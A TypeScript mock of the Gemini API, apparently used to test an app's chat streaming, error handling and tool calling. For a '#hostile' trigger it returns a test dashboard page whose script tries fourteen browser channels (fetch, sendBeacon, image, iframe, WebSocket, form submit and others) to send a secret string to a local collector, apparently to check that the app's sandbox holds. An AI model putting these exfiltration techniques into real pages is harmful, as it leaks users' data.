/**
 * A tiny stand-in for the Gemini API, to try the provider screens without a real key:
 *   MOCK_GEMINI_KEY=demo-key pnpm --filter @orbs/server dev:mock-gemini
 *   ORBS_GEMINI_API_URL=http://127.0.0.1:8798/v1beta
 * It accepts exactly one key and fails the Files endpoint on purpose, so a "failed" row can be seen.
 *
 * Chat: streamGenerateContent answers "Echo: <your last message>" word by word, with cumulative usage, in the CRLF
 * framing the real API uses. Magic words in the last message pick a behaviour:
 *   #429      always answers HTTP 429          #503   always answers HTTP 503
 *   #flaky    fails once with 503, then works  #slow  sends a word, then stalls (to try Stop and the timeouts)
 *   #blocked  ends the reply as blocked (SAFETY)   #empty  finishes without any text
 * Tools: with a tool ending in "get_my_tasks" declared, "#tasks" makes it ask for that tool (the request carries a
 * thought signature, and like Gemini 3 it refuses a replay that lost it), then it reports what the tool said. "#loop"
 * keeps asking for the tool for as long as tools are offered.
 */
import { createServer } from "node:http";

const MODELS = [
  {
    name: "models/gemini-2.5-pro",
    displayName: "Gemini 2.5 Pro",
    inputTokenLimit: 1048576,
    outputTokenLimit: 65536,
    supportedGenerationMethods: ["generateContent", "countTokens"],
  },
  {
    name: "models/gemini-2.5-flash",
    displayName: "Gemini 2.5 Flash",
    inputTokenLimit: 1048576,
    outputTokenLimit: 65536,
    supportedGenerationMethods: ["generateContent", "countTokens"],
  },
  {
    name: "models/gemini-2.0-flash-lite",
    displayName: "Gemini 2.0 Flash-Lite",
    inputTokenLimit: 1048576,
    outputTokenLimit: 8192,
    supportedGenerationMethods: ["generateContent", "countTokens"],
  },
  {
    name: "models/gemini-embedding-001",
    displayName: "Gemini Embedding 001",
    inputTokenLimit: 2048,
    outputTokenLimit: 1,
    supportedGenerationMethods: ["embedContent"],
  },
];

export interface MockCall {
  model: string;
  body: Record<string, unknown>;
}

const frame = (obj: unknown) => `data: ${JSON.stringify(obj)}\r\n\r\n`;
const lastText = (body: Record<string, unknown>) => {
  const contents = (body.contents ?? []) as { role?: string; parts?: { text?: string }[] }[];
  return (
    contents
      .at(-1)
      ?.parts?.map((p) => p.text ?? "")
      .join("") ?? ""
  );
};
const promptTokens = (body: Record<string, unknown>) =>
  Math.max(1, Math.ceil(JSON.stringify([body.systemInstruction, body.contents]).length / 4));

export function startMockGemini(
  key: string,
  port = 0,
): Promise<{ url: string; close: () => Promise<void>; calls: MockCall[] }> {
  const calls: MockCall[] = [];
  const flakySeen = new Set<string>();
  const server = createServer((req, res) => {
    const reply = (status: number, body: unknown, type = "application/json") => {
      res.writeHead(status, { "content-type": type });
      res.end(typeof body === "string" ? body : JSON.stringify(body));
    };
    if (req.headers["x-goog-api-key"] !== key)
      return reply(400, { error: { code: 400, message: "API key not valid. Please pass a valid API key." } });
    const path = new URL(req.url ?? "/", "http://x").pathname;
    if (path === "/v1beta/models") return reply(200, { models: MODELS });
    if (path.startsWith("/v1beta/models/") && !path.includes(":")) return reply(200, MODELS[0]);
    if (path.endsWith(":generateContent"))
      return reply(200, { candidates: [{ content: { parts: [{ text: "OK" }] } }] });
    if (path.endsWith(":streamGenerateContent")) {
      const model = path.slice("/v1beta/models/".length).replace(":streamGenerateContent", "");
      if (!MODELS.some((m) => m.name === `models/${model}`) && !model.startsWith("gemini-3"))
        return reply(404, { error: { code: 404, status: "NOT_FOUND", message: "model not found" } });
      let raw = "";
      req.on("data", (c) => {
        raw += c;
      });
      req.on("end", () => {
        const body = JSON.parse(raw || "{}") as Record<string, unknown>;
        calls.push({ model, body });
        const replayed = (
          (body.contents ?? []) as Array<{ role?: string; parts?: Array<Record<string, unknown>> }>
        ).some(
          (c) => c.role === "model" && (c.parts ?? []).some((p) => p.functionCall && !p.thoughtSignature),
        );
        if (replayed)
          return reply(400, {
            error: {
              code: 400,
              message: "Function call is missing a thought_signature in functionCall parts.",
            },
          });
        const text = lastText(body);
        if (text.includes("#429")) return reply(429, { error: { code: 429, message: "quota" } });
        if (text.includes("#503")) return reply(503, { error: { code: 503, message: "overloaded" } });
        if (text.includes("#flaky") && !flakySeen.has(text)) {
          flakySeen.add(text);
          return reply(503, { error: { code: 503, message: "try again" } });
        }
        res.writeHead(200, { "content-type": "text/event-stream" });
        const input = promptTokens(body);
        if (text.includes("#blocked")) {
          res.end(
            frame({
              candidates: [{ content: { parts: [{ text: "" }] }, finishReason: "SAFETY" }],
              usageMetadata: { promptTokenCount: input, candidatesTokenCount: 0 },
            }),
          );
          return;
        }
        if (text.includes("#empty")) {
          res.end(
            frame({
              candidates: [{ content: { parts: [{ text: "" }] }, finishReason: "STOP" }],
              usageMetadata: { promptTokenCount: input, candidatesTokenCount: 0 },
            }),
          );
          return;
        }
        const declared = (
          (body.tools as Array<{ functionDeclarations?: Array<{ name: string }> }> | undefined) ?? []
        ).flatMap((t) => t.functionDeclarations ?? []);
        const turns = (body.contents ?? []) as Array<{
          role?: string;
          parts?: Array<Record<string, unknown>>;
        }>;
        const everything = turns
          .flatMap((c) => c.parts ?? [])
          .map((p) => String(p.text ?? ""))
          .join(" ");
        const answered = turns.at(-1)?.parts?.find((p) => p.functionResponse) as
          | { functionResponse: { name?: string; response: unknown } }
          | undefined;
        const callTool = (name: string, args: Record<string, unknown>) => {
          res.end(
            frame({
              candidates: [
                {
                  content: {
                    role: "model",
                    parts: [{ functionCall: { name, args }, thoughtSignature: "sig-mock" }],
                  },
                  finishReason: "STOP",
                },
              ],
              usageMetadata: { promptTokenCount: input, candidatesTokenCount: 5 },
            }),
          );
        };
        const tasksTool = declared.find((d) => d.name.endsWith("get_my_tasks"));
        if (tasksTool && ((everything.includes("#tasks") && !answered) || everything.includes("#loop"))) {
          return callTool(tasksTool.name, {});
        }
        // Dashboards: "#dash" makes a page; "#dash2" reads the one the instructions mention, then replaces it;
        // "#hostile" makes a page that tries to send its data away.
        const known = /artifact_id: ([A-Za-z0-9-]+)/.exec(JSON.stringify(body.systemInstruction ?? ""))?.[1];
        const has = (name: string) => declared.some((d) => d.name === name);
        if (everything.includes("#dash2") && known && has("update_dashboard")) {
          if (!answered) return callTool("get_dashboard", { artifact_id: known });
          if (answered.functionResponse.name === "get_dashboard") {
            return callTool("update_dashboard", {
              artifact_id: known,
              html: "<!doctype html><html><body><h1>Second version</h1></body></html>",
            });
          }
        } else if (everything.includes("#dash") && has("create_dashboard") && !answered) {
          const hostile = everything.includes("#hostile");
          return callTool("create_dashboard", {
            title: hostile ? "Hostile page" : "Mock dashboard",
            html: hostile
              ? `<!doctype html><html><body><h1>Hostile</h1><form id="f" action="http://127.0.0.1:9911/form" method="post"><input name="d" value="secret"></form><script>
const leak = "secret-" + document.title;
const T = "http://127.0.0.1:9911";
const tries = [
  () => { location.href = T + "/nav?" + leak; },
  () => fetch(T + "/fetch?" + leak, { mode: "no-cors" }),
  () => { new Image().src = T + "/img?" + leak; },
  () => navigator.sendBeacon(T + "/beacon", leak),
  () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = T + "/css?" + leak; document.head.appendChild(l); },
  () => window.open(T + "/popup?" + leak),
  () => document.getElementById("f").submit(),
  () => { top.location.href = T + "/top?" + leak; },
  () => { const f = document.createElement("iframe"); f.src = T + "/iframe?" + leak; document.body.appendChild(f); },
  () => new WebSocket("ws://127.0.0.1:9911/ws"),
  () => import(T + "/module.js"),
  () => { const s = document.createElement("script"); s.src = T + "/script.js?" + leak; document.head.appendChild(s); },
  () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + T + "/refresh?" + leak; document.head.appendChild(m); },
  () => { const e = document.createElement("embed"); e.src = T + "/embed?" + leak; document.body.appendChild(e); },
];
for (const t of tries) { try { t(); } catch (e) {} }
</script></body></html>`
              : '<!doctype html><html><body><h1>Mock dashboard</h1><canvas id="c" width="300" height="120"></canvas><script>new Chart(document.getElementById("c"),{type:"bar",data:{labels:["A","B"],datasets:[{data:[3,5]}]}})</script></body></html>',
          });
        }
        const words = (
          answered ? `Tool said: ${JSON.stringify(answered.functionResponse.response)}` : `Echo: ${text}`
        ).split(" ");
        let sent = 0;
        const timers: NodeJS.Timeout[] = [];
        res.on("close", () => {
          for (const t of timers) clearTimeout(t);
        });
        words.forEach((word, i) => {
          timers.push(
            setTimeout(
              () => {
                if (res.destroyed) return;
                sent = i + 1;
                const last = i === words.length - 1;
                const slow = text.includes("#slow");
                // "#slow" stops after the first word and never finishes.
                if (slow && i > 0) return;
                res.write(
                  frame({
                    candidates: [
                      {
                        content: { role: "model", parts: [{ text: `${word}${last ? "" : " "}` }] },
                      },
                    ],
                    usageMetadata: { promptTokenCount: input, candidatesTokenCount: sent },
                  }),
                );
                if (last) {
                  res.end(
                    frame({
                      candidates: [{ content: { parts: [{ text: "" }] }, finishReason: "STOP" }],
                      usageMetadata: { promptTokenCount: input, candidatesTokenCount: sent },
                    }),
                  );
                }
              },
              20 * (i + 1),
            ),
          );
        });
      });
      return;
    }
    if (path.endsWith(":countTokens")) return reply(200, { totalTokens: 6 });
    if (path.endsWith(":embedContent")) return reply(200, { embedding: { values: [0.1, 0.2] } });
    if (path === "/v1beta/files")
      return reply(403, { error: { code: 403, message: "The Files API is not enabled for this project." } });
    if (path === "/v1beta/cachedContents") return reply(200, {});
    if (path === "/v1beta/tunedModels") return reply(200, {});
    reply(404, { error: { message: "not found" } });
  });
  return new Promise((resolve) =>
    server.listen(port, "127.0.0.1", () => {
      const address = server.address();
      const p = typeof address === "object" && address ? address.port : port;
      resolve({
        url: `http://127.0.0.1:${p}/v1beta`,
        close: () =>
          new Promise((r) => {
            server.closeAllConnections();
            server.close(() => r(undefined));
          }),
        calls,
      });
    }),
  );
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const mock = await startMockGemini(
    process.env.MOCK_GEMINI_KEY ?? "demo-key",
    Number(process.env.MOCK_GEMINI_PORT ?? 8798),
  );
  console.log(`Mock Gemini on ${mock.url}\nSet ORBS_GEMINI_API_URL=${mock.url}`);
}
